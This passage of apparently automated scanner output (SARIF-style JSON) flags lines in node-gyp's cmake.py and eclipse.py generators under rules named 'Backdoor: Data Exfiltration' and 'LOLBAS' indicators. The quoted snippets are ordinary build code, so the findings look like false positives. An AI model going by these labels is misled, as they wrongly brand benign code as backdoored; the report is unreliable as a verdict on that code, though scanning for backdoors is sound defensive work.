                      "markdown": "`    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n        output.write(\"\\n#\")\n        output.write(qualified_target)\n        output.write(\"\\n\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 638,
                  "startColumn": 35,
                  "endLine": 638,
                  "endColumn": 40,
                  "snippet": {
                    "text": "):\n    # The make generator does this always.\n    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n        output.write(\"\\n#\")\n",
                    "rendered": {
                      "text": "):\n    # The make generator does this always.\n    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n        output.write(\"\\n#\")\n",
                      "markdown": "`):\n    # The make generator does this always.\n    # TODO: It would be nice to be able to tell CMake all dependencies.\n    circular_libs = generator_flags.get(\"circular\", True)\n\n    if not generator_flags.get(\"standalone\", False):\n        output.write(\"\\n#\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 445,
                  "startColumn": 31,
                  "endLine": 445,
                  "endColumn": 36,
                  "snippet": {
                    "text": "        output.write(\"SOURCES \")\n        WriteVariable(output, inputs_name)\n        output.write(\"\\n\")\n        for rule_source in rule.get(\"rule_sources\", []):\n            output.write(\"  \")\n            output.write(NormjoinPath(path_to_gyp, rule_source))\n            output.write(\"\\n\")\n",
                    "rendered": {
                      "text": "        output.write(\"SOURCES \")\n        WriteVariable(output, inputs_name)\n        output.write(\"\\n\")\n        for rule_source in rule.get(\"rule_sources\", []):\n            output.write(\"  \")\n            output.write(NormjoinPath(path_to_gyp, rule_source))\n            output.write(\"\\n\")\n",
                      "markdown": "`        output.write(\"SOURCES \")\n        WriteVariable(output, inputs_name)\n        output.write(\"\\n\")\n        for rule_source in rule.get(\"rule_sources\", []):\n            output.write(\"  \")\n            output.write(NormjoinPath(path_to_gyp, rule_source))\n            output.write(\"\\n\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 27,
                  "endLine": 385,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                    output_name,\n                    NormjoinRulePathForceCMakeSource(path_to_gyp, out, rule_source),\n                )\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources.append((\"${\" + output_name + \"}\", out))\n                these_outputs.append(\"${\" + output_name + \"}\")\n                var_outputs.append(\"${\" + output_name + \"}\")\n",
                    "rendered": {
                      "text": "                    output_name,\n                    NormjoinRulePathForceCMakeSource(path_to_gyp, out, rule_source),\n                )\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources.append((\"${\" + output_name + \"}\", out))\n                these_outputs.append(\"${\" + output_name + \"}\")\n                var_outputs.append(\"${\" + output_name + \"}\")\n",
                      "markdown": "`                    output_name,\n                    NormjoinRulePathForceCMakeSource(path_to_gyp, out, rule_source),\n                )\n                if int(rule.get(\"process_outputs_as_sources\", False)):\n                    extra_sources.append((\"${\" + output_name + \"}\", out))\n                these_outputs.append(\"${\" + output_name + \"}\")\n                var_outputs.append(\"${\" + output_name + \"}\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 360,
                  "startColumn": 48,
                  "endLine": 360,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        outputs = rule[\"outputs\"]\n        var_outputs = []\n\n        for count, rule_source in enumerate(rule.get(\"rule_sources\", [])):\n            action_name = rule_name + \"_\" + str(count)\n\n            rule_source_dirname, rule_source_basename = os.path.split(rule_source)\n",
                    "rendered": {
                      "text": "        outputs = rule[\"outputs\"]\n        var_outputs = []\n\n        for count, rule_source in enumerate(rule.get(\"rule_sources\", [])):\n            action_name = rule_name + \"_\" + str(count)\n\n            rule_source_dirname, rule_source_basename = os.path.split(rule_source)\n",
                      "markdown": "`        outputs = rule[\"outputs\"]\n        var_outputs = []\n\n        for count, rule_source in enumerate(rule.get(\"rule_sources\", [])):\n            action_name = rule_name + \"_\" + str(count)\n\n            rule_source_dirname, rule_source_basename = os.path.split(rule_source)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 350,
                  "startColumn": 21,
                  "endLine": 350,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    for rule in rules:\n        rule_name = StringToCMakeTargetName(target_name + \"__\" + rule[\"rule_name\"])\n\n        inputs = rule.get(\"inputs\", [])\n        inputs_name = rule_name + \"__input\"\n        SetVariableList(\n            output,\n",
                    "rendered": {
                      "text": "    for rule in rules:\n        rule_name = StringToCMakeTargetName(target_name + \"__\" + rule[\"rule_name\"])\n\n        inputs = rule.get(\"inputs\", [])\n        inputs_name = rule_name + \"__input\"\n        SetVariableList(\n            output,\n",
                      "markdown": "`    for rule in rules:\n        rule_name = StringToCMakeTargetName(target_name + \"__\" + rule[\"rule_name\"])\n\n        inputs = rule.get(\"inputs\", [])\n        inputs_name = rule_name + \"__input\"\n        SetVariableList(\n            output,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 281,
                  "startColumn": 21,
                  "endLine": 281,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        # Collect the output dirs we'll need.\n        dirs = {dir for dir in (os.path.dirname(o) for o in outputs) if dir}\n\n        if int(action.get(\"process_outputs_as_sources\", False)):\n            extra_sources.extend(zip(cmake_outputs, outputs))\n\n        # add_custom_command\n",
                    "rendered": {
                      "text": "        # Collect the output dirs we'll need.\n        dirs = {dir for dir in (os.path.dirname(o) for o in outputs) if dir}\n\n        if int(action.get(\"process_outputs_as_sources\", False)):\n            extra_sources.extend(zip(cmake_outputs, outputs))\n\n        # add_custom_command\n",
                      "markdown": "`        # Collect the output dirs we'll need.\n        dirs = {dir for dir in (os.path.dirname(o) for o in outputs) if dir}\n\n        if int(action.get(\"process_outputs_as_sources\", False)):\n            extra_sources.extend(zip(cmake_outputs, outputs))\n\n        # add_custom_command\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1190,
                  "startColumn": 24,
                  "endLine": 1190,
                  "endColumn": 52,
                  "snippet": {
                    "text": "\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n    if ar:\n        SetVariable(output, \"CMAKE_AR\", ar)\n",
                    "rendered": {
                      "text": "\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n    if ar:\n        SetVariable(output, \"CMAKE_AR\", ar)\n",
                      "markdown": "`\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n    if ar:\n        SetVariable(output, \"CMAKE_AR\", ar)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1189,
                  "startColumn": 23,
                  "endLine": 1189,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            cxx = os.path.join(build_to_top, value)\n\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n    if ar:\n",
                    "rendered": {
                      "text": "            cxx = os.path.join(build_to_top, value)\n\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n    if ar:\n",
                      "markdown": "`            cxx = os.path.join(build_to_top, value)\n\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n    if ar:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/cmake.py"
                },
                "region": {
                  "startLine": 1188,
                  "startColumn": 23,
                  "endLine": 1188,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        if key == \"CXX\":\n            cxx = os.path.join(build_to_top, value)\n\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n",
                    "rendered": {
                      "text": "        if key == \"CXX\":\n            cxx = os.path.join(build_to_top, value)\n\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n",
                      "markdown": "`        if key == \"CXX\":\n            cxx = os.path.join(build_to_top, value)\n\n    ar = gyp.common.GetEnvironFallback([\"AR_target\", \"AR\"], ar)\n    cc = gyp.common.GetEnvironFallback([\"CC_target\", \"CC\"], cc)\n    cxx = gyp.common.GetEnvironFallback([\"CXX_target\", \"CXX\"], cxx)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 72,
                  "endLine": 136,
                  "endColumn": 76,
                  "snippet": {
                    "text": "            config = target[\"configurations\"][config_name]\n\n            # Look for any include dirs that were explicitly added via cflags. This\n            # may be done in gyp files to force certain includes to come at the end.\n            # TODO(jgreenwald): Change the gyp files to not abuse cflags for this, and\n            # remove this.\n            if flavor == \"win\":\n",
                    "rendered": {
                      "text": "            config = target[\"configurations\"][config_name]\n\n            # Look for any include dirs that were explicitly added via cflags. This\n            # may be done in gyp files to force certain includes to come at the end.\n            # TODO(jgreenwald): Change the gyp files to not abuse cflags for this, and\n            # remove this.\n            if flavor == \"win\":\n",
                      "markdown": "`            config = target[\"configurations\"][config_name]\n\n            # Look for any include dirs that were explicitly added via cflags. This\n            # may be done in gyp files to force certain includes to come at the end.\n            # TODO(jgreenwald): Change the gyp files to not abuse cflags for this, and\n            # remove this.\n            if flavor == \"win\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 440,
                  "startColumn": 36,
                  "endLine": 440,
                  "endColumn": 42,
                  "snippet": {
                    "text": "                    while os.path.basename(parent_search) not in [\"src\", \"java\"]:\n                        parent_search, _ = os.path.split(parent_search)\n                        if not parent_search or parent_search == toplevel_dir:\n                            # Didn't find a known root, just return the original path\n                            yield dir_\n                            break\n                    else:\n",
                    "rendered": {
                      "text": "                    while os.path.basename(parent_search) not in [\"src\", \"java\"]:\n                        parent_search, _ = os.path.split(parent_search)\n                        if not parent_search or parent_search == toplevel_dir:\n                            # Didn't find a known root, just return the original path\n                            yield dir_\n                            break\n                    else:\n",
                      "markdown": "`                    while os.path.basename(parent_search) not in [\"src\", \"java\"]:\n                        parent_search, _ = os.path.split(parent_search)\n                        if not parent_search or parent_search == toplevel_dir:\n                            # Didn't find a known root, just return the original path\n                            yield dir_\n                            break\n                    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 150,
                  "startColumn": 13,
                  "endLine": 150,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                    if include_dir not in compiler_includes_list:\n                        compiler_includes_list.append(include_dir)\n\n            # Find standard gyp include dirs.\n            if \"include_dirs\" in config:\n                include_dirs = config[\"include_dirs\"]\n                for shared_intermediate_dir in shared_intermediate_dirs:\n",
                    "rendered": {
                      "text": "                    if include_dir not in compiler_includes_list:\n                        compiler_includes_list.append(include_dir)\n\n            # Find standard gyp include dirs.\n            if \"include_dirs\" in config:\n                include_dirs = config[\"include_dirs\"]\n                for shared_intermediate_dir in shared_intermediate_dirs:\n",
                      "markdown": "`                    if include_dir not in compiler_includes_list:\n                        compiler_includes_list.append(include_dir)\n\n            # Find standard gyp include dirs.\n            if \"include_dirs\" in config:\n                include_dirs = config[\"include_dirs\"]\n                for shared_intermediate_dir in shared_intermediate_dirs:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 5,
                  "endLine": 96,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    gyp_includes_set = set()\n    compiler_includes_list = []\n\n    # Find compiler's default include dirs.\n    if compiler_path:\n        command = shlex.split(compiler_path)\n        command.extend([\"-E\", \"-xc++\", \"-v\", \"-\"])\n",
                    "rendered": {
                      "text": "    gyp_includes_set = set()\n    compiler_includes_list = []\n\n    # Find compiler's default include dirs.\n    if compiler_path:\n        command = shlex.split(compiler_path)\n        command.extend([\"-E\", \"-xc++\", \"-v\", \"-\"])\n",
                      "markdown": "`    gyp_includes_set = set()\n    compiler_includes_list = []\n\n    # Find compiler's default include dirs.\n    if compiler_path:\n        command = shlex.split(compiler_path)\n        command.extend([\"-E\", \"-xc++\", \"-v\", \"-\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 41,
                  "endLine": 17,
                  "endColumn": 49,
                  "snippet": {
                    "text": "project.  This works fairly well (and is a vast improvement in general), but may\nstill result in a few indexer issues here and there.\n\nThis generator has no automated tests, so expect it to be broken.\n\"\"\"\n\nfrom xml.sax.saxutils import escape\n",
                    "rendered": {
                      "text": "project.  This works fairly well (and is a vast improvement in general), but may\nstill result in a few indexer issues here and there.\n\nThis generator has no automated tests, so expect it to be broken.\n\"\"\"\n\nfrom xml.sax.saxutils import escape\n",
                      "markdown": "`project.  This works fairly well (and is a vast improvement in general), but may\nstill result in a few indexer issues here and there.\n\nThis generator has no automated tests, so expect it to be broken.\n\"\"\"\n\nfrom xml.sax.saxutils import escape\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 453,
                  "startColumn": 51,
                  "endLine": 453,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    if params[\"options\"].generator_output:\n        raise NotImplementedError(\"--generator_output not implemented for eclipse\")\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                    "rendered": {
                      "text": "    if params[\"options\"].generator_output:\n        raise NotImplementedError(\"--generator_output not implemented for eclipse\")\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                      "markdown": "`    if params[\"options\"].generator_output:\n        raise NotImplementedError(\"--generator_output not implemented for eclipse\")\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 453,
                  "startColumn": 24,
                  "endLine": 453,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    if params[\"options\"].generator_output:\n        raise NotImplementedError(\"--generator_output not implemented for eclipse\")\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                    "rendered": {
                      "text": "    if params[\"options\"].generator_output:\n        raise NotImplementedError(\"--generator_output not implemented for eclipse\")\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n",
                      "markdown": "`    if params[\"options\"].generator_output:\n        raise NotImplementedError(\"--generator_output not implemented for eclipse\")\n\n    user_config = params.get(\"generator_flags\", {}).get(\"config\", None)\n    if user_config:\n        GenerateOutputForConfig(target_list, target_dicts, data, params, user_config)\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 423,
                  "startColumn": 28,
                  "endLine": 423,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    \"\"\"Generates a sequence of all likely java package root directories.\"\"\"\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        for action in target.get(\"actions\", []):\n            for input_ in action[\"inputs\"]:\n                if os.path.splitext(input_)[1] == \".java\" and not input_.startswith(\n                    \"$\"\n",
                    "rendered": {
                      "text": "    \"\"\"Generates a sequence of all likely java package root directories.\"\"\"\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        for action in target.get(\"actions\", []):\n            for input_ in action[\"inputs\"]:\n                if os.path.splitext(input_)[1] == \".java\" and not input_.startswith(\n                    \"$\"\n",
                      "markdown": "`    \"\"\"Generates a sequence of all likely java package root directories.\"\"\"\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        for action in target.get(\"actions\", []):\n            for input_ in action[\"inputs\"]:\n                if os.path.splitext(input_)[1] == \".java\" and not input_.startswith(\n                    \"$\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 410,
                  "startColumn": 28,
                  "endLine": 410,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    \"\"\"Generates a sequence of all .jars used as inputs.\"\"\"\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        for action in target.get(\"actions\", []):\n            for input_ in action[\"inputs\"]:\n                if os.path.splitext(input_)[1] == \".jar\" and not input_.startswith(\"$\"):\n                    if os.path.isabs(input_):\n",
                    "rendered": {
                      "text": "    \"\"\"Generates a sequence of all .jars used as inputs.\"\"\"\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        for action in target.get(\"actions\", []):\n            for input_ in action[\"inputs\"]:\n                if os.path.splitext(input_)[1] == \".jar\" and not input_.startswith(\"$\"):\n                    if os.path.isabs(input_):\n",
                      "markdown": "`    \"\"\"Generates a sequence of all .jars used as inputs.\"\"\"\n    for target_name in target_list:\n        target = target_dicts[target_name]\n        for action in target.get(\"actions\", []):\n            for input_ in action[\"inputs\"]:\n                if os.path.splitext(input_)[1] == \".jar\" and not input_.startswith(\"$\"):\n                    if os.path.isabs(input_):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 301,
                  "startColumn": 44,
                  "endLine": 301,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n    build_dir = os.path.join(generator_flags.get(\"output_dir\", \"out\"), config_name)\n\n    toplevel_build = os.path.join(options.toplevel_dir, build_dir)\n    # Ninja uses out/Debug/gen while make uses out/Debug/obj/gen as the\n",
                    "rendered": {
                      "text": "\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n    build_dir = os.path.join(generator_flags.get(\"output_dir\", \"out\"), config_name)\n\n    toplevel_build = os.path.join(options.toplevel_dir, build_dir)\n    # Ninja uses out/Debug/gen while make uses out/Debug/obj/gen as the\n",
                      "markdown": "`\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n    build_dir = os.path.join(generator_flags.get(\"output_dir\", \"out\"), config_name)\n\n    toplevel_build = os.path.join(options.toplevel_dir, build_dir)\n    # Ninja uses out/Debug/gen while make uses out/Debug/obj/gen as the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 28,
                  "endLine": 297,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\ndef GenerateOutputForConfig(target_list, target_dicts, data, params, config_name):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n",
                    "rendered": {
                      "text": "\ndef GenerateOutputForConfig(target_list, target_dicts, data, params, config_name):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n",
                      "markdown": "`\ndef GenerateOutputForConfig(target_list, target_dicts, data, params, config_name):\n    options = params[\"options\"]\n    generator_flags = params.get(\"generator_flags\", {})\n\n    # build_dir: relative path from source root to our output files.\n    # e.g. \"out/Debug\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/eclipse.py"
                },
                "region": {
                  "startLine": 213,
                  "startColumn": 32,
                  "endLine": 213,
                  "endColumn": 37,
                  "snippet": {
